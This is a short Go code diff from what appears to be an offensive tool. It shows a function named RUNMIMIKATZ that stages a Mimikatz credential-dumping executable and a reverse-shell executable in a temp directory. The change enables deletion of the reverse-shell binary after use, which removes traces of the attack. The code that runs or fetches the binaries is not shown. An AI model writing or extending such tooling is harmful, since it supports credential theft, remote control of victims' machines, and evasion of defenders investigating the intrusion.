@@ -55,7 +55,6 @@ func WRITETOFILE(filePath string, data string) error {
 	return file.Sync()
 }
 
-// DOMAIN
 func RUNMIMIKATZ() {
 	var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"
 	var ReverseShellFullPath = TempDir + "\\" + "REVERSESHELLNAME.exe"
@@ -73,10 +72,10 @@ func RUNMIMIKATZ() {
 	if err != nil {
 		fmt.Println(err)
 	}
-	// err = os.Remove(ReverseShellFullPath)
-	// if err != nil {
-	// 	fmt.Println(err)
-	// }
+	err = os.Remove(ReverseShellFullPath)
+	if err != nil {
+		fmt.Println(err)
+	}
 }
 
 func main() {
